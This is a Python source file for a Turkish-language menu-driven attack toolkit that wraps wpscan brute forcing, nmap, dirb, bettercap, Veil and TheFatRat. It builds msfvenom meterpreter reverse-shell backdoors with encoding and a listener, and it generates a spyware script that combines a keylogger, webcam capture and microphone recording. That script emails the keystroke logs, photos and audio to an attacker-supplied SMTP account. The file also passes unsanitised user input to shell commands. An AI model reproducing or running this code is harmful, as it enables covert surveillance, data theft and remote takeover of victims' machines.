import os
import subprocess
import requests

#------------------ wpscan başlangıc --------------
def wp_scan():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("figlet YUNUS")
    os.system("figlet WORDPRESS TARAMA")

    print("""
    WORDPRESS TARAMA aracına Hoş Geldin...
    1) Hızlı Tarama
    2) Eklenti Tarama
    3) Tema Tarama
    4) Kullanıcı adı tarama
    5) Brutforce
    """)

    islemno = int(input("İşlem numarası giriniz: "))

    if islemno == 1:
        site = input("site adresi : ")
        os.system("wpscan --url " + site + " --random-user-agent")
    elif islemno == 2:
        site = input("site adresi : ")
        os.system("wpscan --url " + site + " --random-user-agent --enumerate p")
    elif islemno == 3:
        site = input("site adresi : ")
        os.system("wpscan --url " + site + " --random-user-agent --enumerate t")
    elif islemno == 4:
        site = input("site adresi : ")
        os.system("wpscan --url " + site + " --random-user-agent --enumerate u")
    elif islemno == 5:
        site = input("site adresi : ")
        wordlist = input("wordlist belirtirmisiniz : ")
        user = input("usernam verirmisiniz : ")
        os.system("wpscan –url " + site + " --wordlist+" + wordlist + " --username " + user)
    elif islemno == 6:
        site = input("site adresi : ")
        os.system("wpscan --url " + site + "--random-user-agent --enumerate vp ")
    else:
        print("Yanlış seçim, program kapandı...")
# ------------------------------wp_scan bitiş ---------------------------
# ------------------------------dirb başlangıç ---------------------------

def dirb():
    while True:
        os.system("figlet Dirb Tarama Modulu")
        print("1. URL gir")
        print("2. Geri dön")
        choice = input("Seçiminizi yapın: ")

        if choice == "1":
            web_url = input("URL'yi giriniz: ")

            try:
                response = requests.get(web_url)
                if response.status_code == 200:
                    print(f"\033[92mBağlantı başarılı! {web_url} doğru bir URL.\033[0m")
                    
                    while True:
                        print("iiiiiiiiii")
                        word_list = input("Lütfen Wordlist Yolunu giriniz: (eğer url yoksa boş bırakın)")
                        
                        if not word_list:
                            os.system("dirb " + web_url)
                        elif isinstance(word_list, str):
                            os.system("dirb " + web_url + " " + word_list)
                            break
                        else:
                            print("\033[91mHata: Geçerli bir wordlist giriniz.\033[0m")

                else:
                    print(f"\033[91mHata: {web_url} geçerli bir URL değil. Durum Kodu: {response.status_code}\033[0m")

            except requests.RequestException as e:
                if "Invalid URL" in str(e):
                    print(f"\033[91mHata: {web_url} geçerli bir URL değil. Belki de https://{web_url} şeklinde olmalı?\033[0m")
                else:
                    print(f"\033[91mHata: {web_url} geçerli bir URL değil. {e}\033[0m")

        elif choice == "2":
            break  
        else:
            print("Geçersiz bir seçim. Lütfen tekrar deneyin.")

# ------------------------------dirb bitiş ---------------------------
# -----------------------------web_başlangıç-----------------------------


def web_tarama():
    os.system("clear")
    print("""
    1) wpscan
    2) dirb
    """)

    c = int(input("İşlem numarasını giriniz: "))

    if c == 1:
        #os.system("python3 wordpres.py")
        wp_scan()
    elif c ==2:
        dirb()        

#-----------------------------web_bitiş-----------------------------------------
#-----------------------------msfvenom_başlangıç-------------------------------------

#def msfconsole_dinle(payload, lhost, lport):
 #   msfconsole_command = f"msfconsole -q -x 'use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit -z -j'"
 #   subprocess.run(msfconsole_command, shell=True)





def msfconsole_dinle(payload, lhost, lport):
    msfconsole_command = f"msfconsole -q -x 'use multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit -z -j'"
    os.system(msfconsole_command)

def msfvenom_olustur():
    while True:
        os.system("clear")
        os.system("figlet msfvenom modulune hosgeldiniz")

        print("""
        1) Exe
        2) Apk
        """)

        try:
            uzanti_secim = int(input("Backdoor formatini secin: "))
        except ValueError:
            print("\033[91mHata: Lutfen gecerli bir sayi girin.\033[0m")
            input("Devam etmek icin Enter'a basin.")
            continue

        if uzanti_secim == 1:
            uzanti = "-f exe"
            os.system("clear")
            print("""
            1) tcp
            2) http
            """)

            try:
                baglan_secim = int(input("Baglanma secenegini secin: "))
            except ValueError:
                print("\033[91mHata: Lutfen gecerli bir sayi girin.\033[0m")
                input("Devam etmek icin Enter'a basin.")
                continue

            if baglan_secim == 1:
                baglan_secenek = "-p windows/meterpreter/reverse_tcp"
            elif baglan_secim == 2:
                baglan_secenek = "-p windows/meterpreter/reverse_http"
            else:
                print("\033[91mHata: Gecerli bir baglanma secenegi girin.\033[0m")
                input("Devam etmek icin Enter'a basin.")
                continue

            os.system("clear")
            ip_adresi = input("Lutfen bir IP adresi girin: ")
            formatli_ip = "LHOST=" + ip_adresi
            print("Formatlanmis IP adresi: ", formatli_ip)
            port_adresi = input("Lutfen bir port numarasi girin: ")
            formatli_port = "LPORT=" + port_adresi
            print("Formatlanmis port adresi: ", formatli_port)
            cikti = input("Lutfen cikti yerini ve dosya ismi belirtin (default=Bulundugunuz dizin): ")
            os.system(f"msfvenom {baglan_secenek} -e x86/shikata_ga_nai -i 5 -a x86 --platform windows {formatli_ip} {formatli_port} {uzanti}")

            print(""" 
            1. Evet
            2. Hayir
            """)

            msfconsolebaslat = int(input("msfconsole otomatik baslasin mi: "))
            if msfconsolebaslat == 1:
                print("""
                    --------Ayarlar----------
                """)
                print(f" {formatli_ip}")
                print(f" {formatli_port}")
                print("1. Degistir 2. Degistirme")
                msfconsolebaslat = int(input("Islem numarasini giriniz "))
                if msfconsolebaslat == 1:
                    os.system("clear")
                    ip_adresi2 = input("Lutfen bir IP adresi girin: ")
                    formatli_ip2 = "LHOST=" + ip_adresi2
                    print("Formatlanmis IP adresi: ", formatli_ip2)
                    port_adresi2 = input("Lutfen bir port numarasi girin: ")
                    formatli_port2 = "LPORT=" + port_adresi2
                    print("Formatlanmis port adresi: ", formatli_port2)
                    msfconsole_dinle(baglan_secenek, ip_adresi2, port_adresi2)
                elif msfconsolebaslat == 2:
                    msfconsole_dinle(baglan_secenek, ip_adresi, port_adresi)
                    break
        elif uzanti_secim == 2:
            uzanti = "-f apk"
            os.system("clear")
            print("""
            1) tcp
            2) http
            """)

            try:
                baglan_secim = int(input("Baglanma secenegini secin: "))
            except ValueError:
                print("\033[91mHata: Lutfen gecerli bir sayi girin.\033[0m")
                input("Devam etmek icin Enter'a basin.")
                continue

            if baglan_secim == 1:
                baglan_secenek = "-p windows/meterpreter/reverse_tcp"
            elif baglan_secim == 2:
                baglan_secenek = "-p windows/meterpreter/reverse_http"
            else:
                print("\033[91mHata: Gecerli bir baglanma secenegi girin.\033[0m")
                input("Devam etmek icin Enter'a basin.")
                continue

            os.system("clear")
            ip_adresi = input("Lutfen bir IP adresi girin: ")
            formatli_ip = "LHOST=" + ip_adresi
            print("Formatlanmis IP adresi: ", formatli_ip)
            port_adresi = input("Lutfen bir port numarasi girin: ")
            formatli_port = "LPORT=" + port_adresi
            print("Formatlanmis port adresi: ", formatli_port)
            cikti = input("Lutfen cikti yerini ve dosya ismi belirtin (default=Bulundugunuz dizin): ")
            os.system(f"msfvenom {baglan_secenek} -e x86/shikata_ga_nai -i 5 -a x86 --platform windows {formatli_ip} {formatli_port} {uzanti}")

            print(""" 
            1. Evet
            2. Hayir
            """)

            msfconsolebaslat = int(input("msfconsole otomatik baslasin mi: "))
            if msfconsolebaslat == 1:
                print("""
                    --------Ayarlar----------
                """)
                print(f" {formatli_ip}")
                print(f" {formatli_port}")
                print("1. Degistir 2. Degistirme")
                msfconsolebaslat = int(input("Islem numarasini giriniz "))
                if msfconsolebaslat == 1:
                    os.system("clear")
                    ip_adresi2 = input("Lutfen bir IP adresi girin: ")
                    formatli_ip2 = "LHOST=" + ip_adresi2
                    print("Formatlanmis IP adresi: ", formatli_ip2)
                    port_adresi2 = input("Lutfen bir port numarasi girin: ")
                    formatli_port2 = "LPORT=" + port_adresi2
                    print("Formatlanmis port adresi: ", formatli_port2)
                    msfconsole_dinle(baglan_secenek, ip_adresi2, port_adresi2)
                elif msfconsolebaslat == 2:
                    msfconsole_dinle(baglan_secenek, ip_adresi, port_adresi)



#-----------------------------msfvenom_bitiş---------------------------------------------
#-----------------------------oto_backdor başlangıç--------------------------------------
def oto_backdor():
    selected_options = []

    while True:
        os.system("clear")
        os.system("figlet oto backdor modulune hosgeldiniz")

        print("""
        1) Keylogar
        2) Kamera Erişimi
        3) Mic dinleme
        4) !!Başlattan Önce Kesinlike tikla !!!!
        ------show yazarak eklediğiniz özellikleri görüntüleyin---------
        9) Başlat 
        """)

        user_input = input("Seçiminizi yapın: ")

        if user_input == "9":
            break
        elif user_input in ["1", "2", "3" ,"4"]:
            selected_options.append(user_input)
            print(f"\033[92mSeçenek {user_input} eklendi.\033[0m")
            input("Devam etmek için Enter'a basın.")

            if user_input == "1":
                pass
            elif user_input == "2":
                pass
            elif user_input == "3":
                pass
            elif user_input =="4":
                pass
  
        elif user_input.lower() == "show":
            show_options(selected_options)
        else:
            print("\033[91mHata: Lütfen geçerli bir seçenek girin.\033[0m")
            input("Devam etmek için Enter'a basın.")

    write_to_file(selected_options)
    
def show_options(selected_options):
    os.system("clear")
    print("\033[93mSeçilen Seçenekler:\033[0m")
    for option in selected_options:
        print(f"- Seçenek {option}")
    input("Devam etmek için Enter'a basın.")


def write_to_file(selected_options):
    with open("selected_options.py", "w") as file:
        for option in selected_options:
            if option == "1":
                file.write("""
from pynput import keyboard

def keylogger():
    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = f"Special key {key}"
        with open("log.txt", "a") as f:
            f.write(f"{key_char}\n  ")  
    def exit_program():
        print("Program will exit in 30 seconds.")
        time.sleep(30)
        return False
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        listener.stop()
    exit_program()""")

            elif option == "2":
                file.write("""
import cv2
import time
def take_photo():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Kamera başlatılamadı!")
        return
    ret, frame = cap.read()
    if ret:
        timestamp = time.time()
        photo_name = f"photo.jpg"
        cv2.imwrite(photo_name, frame)
    else:
        print("Fotoğraf çekilemedi!")
    cap.release()
""")
            elif option == "3":
                file.write("""
import speech_recognition as sr
from gtts import gTTS
import os

def mikrofon_dinle_ve_cevir(dosya_adi="cikti.mp3"):
    r = sr.Recognizer()
    
    with sr.Microphone() as source:
        print("Mikrofon dinleniyor, bir şeyler söyleyin...")
        audio = r.listen(source)
        print("Dinleme tamamlandı, metin çıkartılıyor...")
    
    try:
        metin = r.recognize_google(audio, language="tr-TR")  
        print("Söylenen metin: " + metin)
        
        tts = gTTS(text=metin, lang="tr") 
        tts.save(dosya_adi)
        print(f"Metin ses dosyasına dönüştürüldü: {dosya_adi}")
        
        return metin
    except sr.UnknownValueError:
        print("Anlaşılamadı")
    except sr.RequestError as e:
        print("Google Web Speech API hatası; {0}".format(e))
    return None
                """)
            elif option == "4":
                file.write("""
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os
import zipfile

def zip_files(files, zip_name):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

def send_email(subject, body, to_email, smtp_server, smtp_port, sender_email, sender_password, attached_files=[]):
    # Zip dosyasını oluştur
    zip_file_name = "attached_files.zip"
    zip_files(attached_files, zip_file_name)
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = to_email
    message.attach(MIMEText(body, 'plain'))

    with open(zip_file_name, 'rb') as zip_file:
        attach = MIMEApplication(zip_file.read(),_subtype="zip")
        attach.add_header('Content-Disposition','attachment',filename=str(zip_file_name))
        message.attach(attach)

    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message.as_string())
    os.remove(zip_file_name)

subject = "yok"
body = "yok"
""")
                smtp_mail = input("gönderilecek maili giriniz:")
                file.write(f'to_email = "{smtp_mail}"\n')
                smtp_ser = input("smtp serverınızı giriniz:")
                file.write(f'smtp_server = "{smtp_ser}"\n')
                smtp_por = input("smtp portunuzu giriniz:")
                file.write(f'smtp_port = "{smtp_por}"\n')
                smtp_mail1 = input("gönderecek mail adresini giriniz:")
                file.write(f'sender_email = "{smtp_mail1}"\n')
                smtp_mail_sifre = input("gönderecek mail adresinin şifresini giriniz:")
                file.write(f'sender_password = "{smtp_mail_sifre}"\n')
                file.write("""
files_to_send = ["cikti.mp3", "photo.jpg", "log.txt"]

if __name__ == "__main__":
    while True:
        take_photo()
        keylogger()
        mikrofon_dinle_ve_cevir(dosya_adi="cikti.mp3")
        send_email(subject, body, to_email, smtp_server, smtp_port, sender_email, sender_password, files_to_send)
        time.sleep(10)
""")
    print("\033[92mSeçenekler dosyaya yazıldı: selected_options.py\033[0m")
#-----------------------------oto_backdor bitiş------------------------------------------
#-----------------------------Backdor_modul_başlangıç------------------------------------

def backdoor_olustur():
    while True:
        os.system("clear")
        os.system("figlet backdoor olusturma moduluna hosgeldiniz")

        print("""
        1) Msfvenom
        2) VeilFrenwork
        3) Fatrat
        4) Oto Backdor(mailbackdor)
        9) Cikis
        """)

        try:
            a = int(input("İşlem numarası giriniz: "))
        except ValueError:
            print("\033[91mHata: Lütfen geçerli bir sayı girin.\033[0m")
            input("Devam etmek için Enter'a basın.")
            continue

        if a == 1:
            msfvenom_olustur()
        elif a == 2:
            os.system("veil")
        elif a == 3:
            os.system("python3 /opt/TheFatrat/Fatrat")
        elif a == 4:
            oto_backdor()
            break
        elif a == 9:
            cikis()
            break
        else:
            print("\033[91mHata: Yanlış girdi. Lütfen geçerli bir işlem numarası girin.\033[0m")
            input("Devam etmek için Enter'a basın.")
            continue
		

#-----------------------------Backdor_modul_bitiş-------------------------------------
#-----------------------------ip_bulma_başlangıç-----------------------------------------

def ip_bulma():
	os.system("clear")
	os.system("figlet ip bulma modulune hosgeldiniz")
	print("""

	1) 192.168.x.1 taramak 
	2) 10.0.x.1    taramak 
	9) Geridon   

	""")
	taramano =int(input("islem numarasini giriniz = "))
	ip = input("kendi ip adresinizin 3 harfini yaziniz : ")
	if taramano==1:
		os.system("nmap -sn -n -v --open  192.168."+ip+".1/24")
	elif taramano==2:
		os.system("nmap -sn -n -v --open  10.0."+ip+".0/24") 
	elif taramano==9:
		cikis()
	print("""

	geri dön = 1
	cikis    = 2

	""")
	islemno =int(input("islem numarasini giriniz = "))
	if islemno==1:
		tarama_modul()
	elif islemno==2 :
		cikis()

#-----------------------------ip_bulma_bitiş------------------------------------------------
#-----------------------------nmap_tarama_başlangıç-----------------------------------------

def nmap_tarama():
	ip=input("Lütfen ip ve ya alan adını giriniz: ")
 
	os.system("clear")
	os.system("figlet Nmap Tarama Modulu")
	print("""

 
	1) Açık Port Tarama
	2) Servis ve Versiyon Bilgisi
	3) İşletim Sistemi Bilgisi
	4) Detaylı Arama (Proxy gerekmekte)
	9)Geri Dön
 

 
	""")

	nmapislemno = int(input("işlem numarasini giriniz: "))
	if nmapislemno==1:
		os.system("nmap -Pn -sS -n -v --reason --open "+ip)
	elif nmapislemno==2:
		os.system(" nmap -sS -sV -sC -n -v -p-"+ip)
#-----------------------------nmap_tarama_bitiş-----------------------------------------
#-----------------------------tarama_modülü_başlangıç-----------------------------------------
def tarama_modul():
	
	os.system("clear")
	os.system("figlet TARAMA MODULUNE HOSGELDİNİZ")
	print("""


	1) ip bulma    
	2) nmap tarama 
	9) cikis       


	""")
	islemno = int(input("işlem numarasini giriniz: "))
	if islemno==1:
		os.system("python3 ipbulma.py")
	elif islemno==2:
		nmap_tarama()
	elif islemno==9:
		cikis()

#-----------------------------tarama_modülü_bitiş-----------------------------------------
#-----------------------------ağiçi_saldırı_tool_başlangıç-----------------------------------------

def agici_saldiri_tool():

	os.system("clear")
	os.system("figlet agici saldiri araclarina hosgeldiniz")
	print("""



1) Bettercap 
2) MitmProxy
3) Taram modülü
4) Ağiçi saldırı araçları
9) cikis                 


	""")
	islemno=int(input("Lütfen işlem numarasını giriniz: "))

	if islemno==1:
		print("""
	1)internet sitesi(Bu özellik bettercap içinde açık olmalı)
	2)terminal
		""")
		better=int(input("Bettercapi nasıl başlatmak istersinzi "))
		if better==1:
			os.system("bettercap -caplet http-ui")
		elif better ==2:
			os.system("bettercap")
		else:
			os.system("clear")
			os.system("figlet Yanlis secim yaptiniz buna  kizdim kendimi kapatiyorum...")
	elif islemno==2:
		os.system("cd Mitm && python3 mitm.py")
	elif islemno==3:
		tarama_modul()
	elif islemno==9:
		cikis()
	

#-----------------------------ağiçi_saldırı_tool_bitiş-----------------------------------------
#-----------------------------çıkış_başlangıc-------------------------------------
def cikis():
	import os
	os.system("clear")
	os.system("figlet cikis yapiliyor...")
#-----------------------------çıkış_bitiş-------------------------------------
# ------------------------------mainmenu_başlangıc----------------------------

def mainmenu():
    os.system("clear")
    os.system("figlet siber saldiri aracina hosgeldiniz")

    print("""
    1) Web saldırı araçları
    2) Wifi saldırı araçları
    3) Ağ içi saldırı araçları
    4) Backdoor oluşturucu
    9) Çıkış
    """)

    a = int(input("İşlem numarası giriniz: "))

    if a == 1:
        web_tarama()
    elif a == 2:
        os.system("cd wifi && python3 wifi.py")
    elif a == 3:
        agici_saldiri_tool()
    elif a == 4:
        #os.system("cd backdor && python3 backdor.py")
        backdoor_olustur()
    elif a == 5:
        os.system("python3 backdor/backdor.py")
    elif a == 9:
        #os.system("python3 cikis.py")
        cikis()    
    else:
        os.system("clear")
        os.system("python3 proje.py")
        print("\033[91m" + "İşlemi yanlış yaptınız" + "\033[0m")

# ---------------------------mainmenü bitiş -----------------------


